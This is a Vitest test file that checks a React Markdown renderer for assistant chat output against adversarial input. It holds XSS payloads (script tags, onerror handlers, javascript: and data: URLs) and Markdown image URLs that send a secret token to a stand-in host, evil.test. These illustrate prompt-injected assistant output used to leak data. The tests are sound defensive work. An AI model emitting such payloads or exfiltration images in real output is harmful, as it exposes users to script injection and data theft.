import { describe, expect, it } from 'vitest';
import { renderToStaticMarkup } from 'react-dom/server';
import { Markdown } from './Markdown';

// Adversarial fixtures for assistant Markdown rendering (Phase 7 hardening, IMPLEMENTATION_PLAN
// §10.4). Assistant/worker output is attacker-influenceable (prompt injection, compromised
// Worker, malicious repo content summarized back into chat) so this content must never gain
// script execution, DOM-based XSS, or a way to make the renderer perform a network fetch whose
// URL (and therefore query-string payload) the attacker controls. Uses react-dom/server so no
// browser/jsdom is needed — a real DOM is not required to prove no <script>/<img src> reaches
// the markup.

function render(content: string): string {
  return renderToStaticMarkup(<Markdown content={content} />);
}

describe('Markdown adversarial fixtures', () => {
  it('never renders a script tag as an executable element', () => {
    const html = render('before\n\n<script>alert(document.cookie)</script>\n\nafter');
    expect(html).not.toContain('<script');
    expect(html).not.toMatch(/<script[\s>]/i);
  });

  it('never renders iframe/object/embed as live elements', () => {
    const html = render(
      [
        '<iframe src="https://evil.test/frame"></iframe>',
        '<object data="https://evil.test/obj"></object>',
        '<embed src="https://evil.test/embed">',
      ].join('\n\n'),
    );
    expect(html).not.toMatch(/<iframe[\s>]/i);
    expect(html).not.toMatch(/<object[\s>]/i);
    expect(html).not.toMatch(/<embed[\s>]/i);
  });

  it('strips inline event-handler attributes carried on raw HTML', () => {
    const html = render('<img src=x onerror=alert(1)>\n\n<div onclick="alert(1)">click</div>');
    // Raw HTML is dropped entirely (remark-rehype without rehype-raw) and re-emitted as
    // HTML-escaped text, so "onerror"/"onclick" may appear as inert characters but never as a
    // live attribute on a real element — assert no unescaped tag reaches the DOM at all.
    expect(html).not.toMatch(/<img[\s>]/i);
    expect(html).not.toMatch(/<div onclick/i);
    expect(html).toContain('&lt;img src=x onerror=alert(1)&gt;');
    expect(html).toContain('&lt;div onclick=&quot;alert(1)&quot;&gt;');
  });

  it('neutralizes a javascript: URL to inert, unclickable text', () => {
    const html = render('[click me](javascript:alert(document.cookie))');
    expect(html).not.toContain('javascript:');
    expect(html).toContain('md-link-plain');
    expect(html).not.toMatch(/<a[\s>]/i);
  });

  it('neutralizes a data: URL to inert, unclickable text', () => {
    const html = render('[click me](data:text/html,<script>alert(1)</script>)');
    expect(html).not.toContain('data:text/html');
    expect(html).toContain('md-link-plain');
    expect(html).not.toMatch(/<a[\s>]/i);
  });

  it('neutralizes a vbscript: URL to inert, unclickable text', () => {
    const html = render('[click me](vbscript:msgbox(1))');
    expect(html).not.toContain('vbscript:');
    expect(html).toContain('md-link-plain');
  });

  it('tolerates whitespace/case tricks around an unsafe scheme rather than being fooled by them', () => {
    const html = render('[x](\tJAVASCRIPT:alert(1))');
    expect(html).toContain('md-link-plain');
    expect(html).not.toMatch(/<a[\s>]/i);
  });

  it('allows an https link with a safe-open policy: noopener/noreferrer and no eager navigation', () => {
    const html = render('[docs](https://example.com/docs)');
    expect(html).toMatch(/<a[^>]*href="https:\/\/example\.com\/docs"/);
    expect(html).toContain('rel="noopener noreferrer"');
  });

  it('allows a mailto link through the same safe-anchor path', () => {
    const html = render('[mail](mailto:person@example.com)');
    expect(html).toMatch(/<a[^>]*href="mailto:person@example\.com"/);
  });

  it('never fetches a Markdown image URL: no <img src> and no eager <link rel=preload>', () => {
    const html = render('![leak](https://evil.test/pixel.png?leak=super-secret-token)');
    // The URL may still surface as inert text (a `title` tooltip, mirroring SafeAnchor) — the
    // security property is that no element with a `src`/`href` fetch target is emitted.
    expect(html).not.toMatch(/<img[\s>]/i);
    expect(html).not.toMatch(/<link[^>]*rel="preload"/i);
    expect(html).not.toMatch(/\ssrc="https:\/\/evil\.test/i);
    expect(html).not.toMatch(/\shref="https:\/\/evil\.test/i);
    expect(html).toContain('md-image-plain');
    expect(html).toContain('leak');
  });

  it('never fetches a Markdown image even when alt text is absent', () => {
    const html = render('![](https://evil.test/track.gif?u=abc123)');
    expect(html).not.toMatch(/<img[\s>]/i);
    expect(html).not.toMatch(/<link[^>]*rel="preload"/i);
    expect(html).not.toMatch(/\ssrc="https:\/\/evil\.test/i);
  });

  it('never fetches an image behind a data: URI wrapper either (defense in depth)', () => {
    const html = render('![x](data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=)');
    expect(html).not.toMatch(/<img[\s>]/i);
    expect(html).not.toContain('rel="preload"');
  });

  it('escapes an oversized adversarial payload without crashing the renderer', () => {
    const bomb = '['.repeat(5_000) + 'x'.repeat(5_000) + ']('.repeat(1) + 'javascript:0)';
    expect(() => render(bomb)).not.toThrow();
  });

  it('does not let a fenced code block masquerade as a live HTML element', () => {
    const html = render('```html\n<script>alert(1)</script>\n```');
    expect(html).not.toMatch(/<script[\s>]/i);
    expect(html).toContain('&lt;script&gt;');
  });
});
